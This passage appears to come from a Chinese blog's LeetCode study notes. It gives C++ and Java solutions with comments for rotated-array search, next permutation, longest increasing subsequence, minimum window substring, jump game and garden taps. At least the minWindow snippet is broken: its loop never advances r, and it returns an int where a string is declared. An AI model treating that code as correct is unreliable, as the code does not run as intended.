class="line">当nums[mid]=nums[l]=nums[r]就判断不了，这时候仅需要l++(r--)直到这个条件不满足</span><br></pre></td></tr></table></figure><h2 id="含重复元素的旋转数组"><a href="#含重复元素的旋转数组" class="headerlink" title="含重复元素的旋转数组"></a>含重复元素的旋转数组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool search(vector&lt;int&gt;&amp; nums, int target) &#123;</span><br><span class="line">        //如果mid上的元素==left和right则没法继续搜索，可以移动边界直到left和right不等</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=nums.size()-1;</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">            int mid=l+(r-l)/2;</span><br><span class="line">            if(target==nums[mid])</span><br><span class="line">            &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            if(nums[mid]==nums[l]&amp;&amp;nums[mid]==nums[r])</span><br><span class="line">            &#123;</span><br><span class="line">                l++;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            //在左边</span><br><span class="line">            if(nums[mid]&gt;=nums[l])</span><br><span class="line">            &#123;</span><br><span class="line">                if(target&gt;=nums[l]&amp;&amp;target&lt;nums[mid])</span><br><span class="line">                &#123;</span><br><span class="line">                    r=mid-1;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    l=mid+1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if(target&lt;=nums[r]&amp;&amp;target&gt;nums[mid])</span><br><span class="line">                &#123;</span><br><span class="line">                    l=mid+1;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    r=mid-1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="下一个排列"><a href="#下一个排列" class="headerlink" title="下一个排列"></a>下一个排列</h2><p>按照字典序找数组的下一个排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">从后向前查找第一个相邻升序的元素对 (i,j)，满足 A[i] &lt; A[j]。此时 [j,end) 必然是降序</span><br><span class="line">在 [j,end) 从后向前查找第一个满足 A[i] &lt; A[k] 的 k。A[i]、A[k] 分别就是上文所说的「小数」、「大数」</span><br><span class="line">将 A[i] 与 A[k] 交换</span><br><span class="line">可以断定这时 [j,end) 必然是降序，逆置 [j,end)，使其升序</span><br><span class="line">如果在步骤 1 找不到符合的相邻元素对，说明当前 [begin,end) 为一个降序顺序，则直接跳到步骤 4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    void nextPermutation(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        //从右开始往左找，找到第一个峰值元素a[m]左边索引最大的元素a[l]，使得a[m]&gt;a[l]</span><br><span class="line">        //在a[l]右边找索引最大的元素a[r],使得a[r]&gt;a[l](肯定存在)</span><br><span class="line">        //交换a[r]和a[l]</span><br><span class="line">        //反转a[l+1]-最后一个元素</span><br><span class="line">        //只有一个节点</span><br><span class="line">        int n=nums.size();</span><br><span class="line">        if(n==1)</span><br><span class="line">        &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        //先找最右侧第一个峰值元素</span><br><span class="line">        int m=n-1;</span><br><span class="line">        int l=-1;</span><br><span class="line">        int r=n;</span><br><span class="line">        for(int i=n-1;i&gt;0;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            if(nums[i-1]&lt;nums[i])</span><br><span class="line">            &#123;</span><br><span class="line">                m=i;</span><br><span class="line">                l=i-1;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(l==-1)</span><br><span class="line">        &#123;</span><br><span class="line">            reverse(nums.begin(),nums.end());</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        //找右边索引最大的a[r]</span><br><span class="line">        for(int i=n-1;i&gt;l;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            if(nums[i]&gt;nums[l])</span><br><span class="line">            &#123;</span><br><span class="line">                r=i;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(nums[l],nums[r]);</span><br><span class="line">        reverse(nums.begin()+l+1,nums.end());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>遇到的坑</p><h2 id="bool变量取反"><a href="#bool变量取反" class="headerlink" title="bool变量取反"></a>bool变量取反</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool flag=true;</span><br><span class="line">flag=!flag;</span><br></pre></td></tr></table></figure><p>rand()和srand()、time()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time_t time(time_t* time)</span><br><span class="line">time为传入传出参数</span><br><span class="line">time(NULL):返回现在到1970.1.1日之间的秒数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srand(unsigned int seed)</span><br><span class="line">srand(time(NULL))</span><br><span class="line">rand()%(b-a+1)+a  : [a,b]</span><br></pre></td></tr></table></figure><h2 id="数组交换"><a href="#数组交换" class="headerlink" title="数组交换"></a>数组交换</h2><h2 id="奇数在前，偶数在后，不改变相对位置"><a href="#奇数在前，偶数在后，不改变相对位置" class="headerlink" title="奇数在前，偶数在后，不改变相对位置"></a>奇数在前，偶数在后，不改变相对位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0,i-1]为奇数，i为当前判断元素</span><br><span class="line">i为奇数，i++</span><br><span class="line">i为偶数，在[i+1,n-1]之间找第一个奇数与其交换，找到交换后i++，找不到直接退出，满足条件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;int&gt; exchange(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int i=0;</span><br><span class="line">    while(i&lt;nums.size())</span><br><span class="line">    &#123;</span><br><span class="line">        if(nums[i]%2)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            int j=i+1;</span><br><span class="line">            while(j&lt;nums.size())</span><br><span class="line">            &#123;</span><br><span class="line">                if(nums[j]%2)</span><br><span class="line">                &#123;</span><br><span class="line">                    swap(nums[i],nums[j]);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            if(j==nums.size())</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return nums;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="12-子序列-Longest-Increasing-Squence-、子串问题"><a href="#12-子序列-Longest-Increasing-Squence-、子串问题" class="headerlink" title="12.子序列(Longest Increasing Squence)、子串问题"></a>12.子序列(Longest Increasing Squence)、子串问题</h1><p>子串：子串必须连续</p><p>子序列:子序列可以不连续</p><h2 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法：1.O(n^2)的dp</span><br><span class="line"> 2.O(nlogn)的二分贪心</span><br></pre></td></tr></table></figure><p>dp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    //dp[i]表示以nums[i]结尾的最长子序列</span><br><span class="line">    //dp[i]=max(dp[j])+1      nums[j]&lt;nums[i]   j&lt;i</span><br><span class="line">    //nums[j]&gt;nums[i]  dp[i]=1</span><br><span class="line">    int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;int&gt; dp(nums.size(),1);</span><br><span class="line">        for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=0;j&lt;i;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(nums[i]&gt;nums[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    dp[i]=max(dp[i],dp[j]+1);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return *max_element(begin(dp),end(dp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>模拟发牌(贪心+二分)——同时能找出最大子序列的一组元素</p><p><img src="https://pic.leetcode-cn.com/1629170842-gahWzG-image.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">//方法1：</span><br><span class="line">    //dp[i]表示以nums[i]结尾的最长子序列</span><br><span class="line">    //dp[i]=max(dp[j])+1      nums[j]&lt;nums[i]   j&lt;i</span><br><span class="line">    //nums[j]&gt;nums[i]  dp[i]=1</span><br><span class="line">//方法2:</span><br><span class="line">    //码牌法</span><br><span class="line">    //1.每一个牌处理</span><br><span class="line">    //2.小牌放在最左堆下面，如果没有的话新建堆</span><br><span class="line">    int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;int&gt; ans(nums.size(),-1);</span><br><span class="line">        int left=0;</span><br><span class="line">        int right=0;</span><br><span class="line">        int piles=1;</span><br><span class="line">        ans[0]=nums[0];</span><br><span class="line">        for(int i=1;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            left=0;</span><br><span class="line">            right=piles;</span><br><span class="line">            //每个元素处理</span><br><span class="line">            //[left,right)中寻找nums[i]的第一个小的</span><br><span class="line">            //lower_bound</span><br><span class="line">            while(left&lt;right)</span><br><span class="line">            &#123;</span><br><span class="line">                int mid=left+(right-left)/2;</span><br><span class="line">                if(ans[mid]&gt;=nums[i])</span><br><span class="line">                &#123;</span><br><span class="line">                    right=mid;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(ans[mid]&lt;nums[i])</span><br><span class="line">                &#123;</span><br><span class="line">                    left=mid+1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if(left==piles)</span><br><span class="line">                piles++;</span><br><span class="line">            ans[left]=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return piles;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最小覆盖子串"><a href="#最小覆盖子串" class="headerlink" title="最小覆盖子串"></a>最小覆盖子串</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    string minWindow(string s, string t) &#123;</span><br><span class="line">        unordered_map&lt;char,int&gt; needs;</span><br><span class="line">        unordered_map&lt;char,int&gt; win;</span><br><span class="line">        for(int i=0;i&lt;t.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            needs[t[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        int valid=0;</span><br><span class="line">        //滑动窗口</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=0;</span><br><span class="line">        //</span><br><span class="line">        int minsize=INT_MAX;</span><br><span class="line">        while(r&lt;=s.size())</span><br><span class="line">        &#123;</span><br><span class="line">            //扩张右边</span><br><span class="line">            if(needs.count(s[r]))</span><br><span class="line">            &#123;</span><br><span class="line">                win[s[r]]++;</span><br><span class="line">                if(win[s[r]]==needs[s[r]])</span><br><span class="line">                &#123;</span><br><span class="line">                    valid++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //收缩左边界</span><br><span class="line">            //当包含一个t时</span><br><span class="line">            while(valid==needs.size())</span><br><span class="line">            &#123;</span><br><span class="line">                //当左边界时win里面的</span><br><span class="line">                if(needs.count(s[l]))</span><br><span class="line">                &#123;</span><br><span class="line">                    win[s[l]]--;</span><br><span class="line">                    if(win[s[l]]==0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        win.erase(s[l]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    valid--;     </span><br><span class="line">                &#125;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            minsize=min(minsize,r-l+1);</span><br><span class="line">        &#125;</span><br><span class="line">        return minsize;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="13-贪心算法"><a href="#13-贪心算法" class="headerlink" title="13.贪心算法"></a>13.贪心算法</h1><h2 id="分发糖果"><a href="#分发糖果" class="headerlink" title="分发糖果"></a>分发糖果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路：两次遍历，初始化全为1，第一遍从前往后，后面大的+1，第二遍前面大于后面前面+1</span><br></pre></td></tr></table></figure><h2 id="跳跃游戏"><a href="#跳跃游戏" class="headerlink" title="跳跃游戏"></a>跳跃游戏</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似双指针，顶一个k为当前能到达的最大下标，初始化为0，</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bool canJump(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int k=0;</span><br><span class="line">    for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">    if(i&gt;k)</span><br><span class="line">    &#123;</span><br><span class="line">    return false;</span><br><span class="line">    &#125;</span><br><span class="line">        k=max(k,nums[i]+i);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public static boolean canJump(int[] nums) &#123;</span><br><span class="line">        if (nums == null) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //前n-1个元素能够跳到的最远距离</span><br><span class="line">        int k = 0;</span><br><span class="line">        for (int i = 0; i &lt;= k; i++) &#123;</span><br><span class="line">            //第i个元素能够跳到的最远距离</span><br><span class="line">            int temp = i + nums[i];</span><br><span class="line">            //更新最远距离</span><br><span class="line">            k = Math.max(k, temp);</span><br><span class="line">            //如果最远距离已经大于或等于最后一个元素的下标,则说明能跳过去,退出. 减少循环</span><br><span class="line">            if (k &gt;= nums.length - 1) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //最远距离k不再改变,且没有到末尾元素</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="最小跳次数"><a href="#最小跳次数" class="headerlink" title="最小跳次数"></a>最小跳次数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找[start,end]间最远的一跳作为maxpos，当i==end时需要更新end=maxpos，start=end+1，count++</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int jump(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int end=0;</span><br><span class="line">    //[start,end]间的最大跳作为下一个</span><br><span class="line">    int count=0;</span><br><span class="line">    int maxpos=0;</span><br><span class="line">    for(int i=0;i&lt;nums.size()-1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        maxpos=max(maxpos,nums[i]+i);</span><br><span class="line">        if(i==end)</span><br><span class="line">        &#123;</span><br><span class="line">        end=maxpos;</span><br><span class="line">        count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int jump(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int start=0;</span><br><span class="line">        int end=0;</span><br><span class="line">        //[start,end]间的最大跳作为下一个</span><br><span class="line">        int count=0;</span><br><span class="line"></span><br><span class="line">        while(end&lt;nums.size()-1)</span><br><span class="line">        &#123;</span><br><span class="line">            int maxpos=0;</span><br><span class="line">            for(int i=start;i&lt;=end;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                maxpos=max(maxpos,nums[i]+i);</span><br><span class="line">            &#125;</span><br><span class="line">            start=end+1;</span><br><span class="line">            end=maxpos;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        return count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>或者采用动态规划的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int jump(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        const int n = nums.size();</span><br><span class="line">        int dp[n];</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=INT_MAX;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[0] = 0;  //0位置步数是0</span><br><span class="line">        for(int i = 0; i &lt; n; ++i)  //遍历每一个点</span><br><span class="line">            for(int j = 1; j &lt;= nums[i] &amp;&amp; i + j &lt; n; ++j) //这个点能够到达的点</span><br><span class="line">                dp[i + j] = min(dp[i + j], dp[i] + 1); //尝试更新所到之点</span><br><span class="line">        return dp[n - 1];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="覆盖花园的最少水龙头"><a href="#覆盖花园的最少水龙头" class="headerlink" title="覆盖花园的最少水龙头"></a>覆盖花园的最少水龙头</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">贪心的算法：</span><br><span class="line">建立一个数组land[i]表示能覆盖到i土地的水龙头右边界最大的覆盖位置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int minTaps(int n, vector&lt;int&gt;&amp; ranges) </span><br><span class="line">&#123;</span><br><span class="line">vector&lt;int&gt; land(n);</span><br><span class="line">for (int i = 0; i &lt; ranges.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">//遍历到没个i土地，看一下上面的水龙头左右边界</span><br><span class="line">int l = max(i - ranges[i], 0);</span><br><span class="line">int r = min(i + ranges[i], n);</span><br><span class="line">//内循环将左右边界里的最右边界更新一下</span><br><span class="line">for (int j = l; j &lt; r; j++)</span><br><span class="line">&#123;</span><br><span class="line">land[j] = max(land[j], r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int cnt = 0;</span><br><span class="line">int cur = 0;</span><br><span class="line">while (cur &lt; n)</span><br><span class="line">&#123;</span><br><span class="line">if (land[cur] == 0) return -1;</span><br><span class="line">cur = land[cur];</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">return cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解题思路：</span><br><span class="line"></span><br><span class="line">leetcode上一维的区间合并计算问题种类很多，但是都是一个套路，起点排序，然后通过贪心的方法，进行具体分析；</span><br><span class="line">这里先将水龙头位置信息转化为其有效工作区间信息；</span><br><span class="line">然后根据区间的左端点进行升序；</span><br><span class="line">最后枚举所有区间，通过贪心思想，获得可覆盖当前有效区间的最右区间。</span><br><span class="line">各位力扣老爷，公审英皇，传播自由花费巨大，还请各位立刻捐赠20个赞，以便我军再战。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minTaps(int n, int[] ranges) &#123;</span><br><span class="line">        // 定义一个区间数组</span><br><span class="line">        int[][] region = new int[n + 1][2];</span><br><span class="line"></span><br><span class="line">        // 将原来的水龙头位置信息转化为洒水区间信息</span><br><span 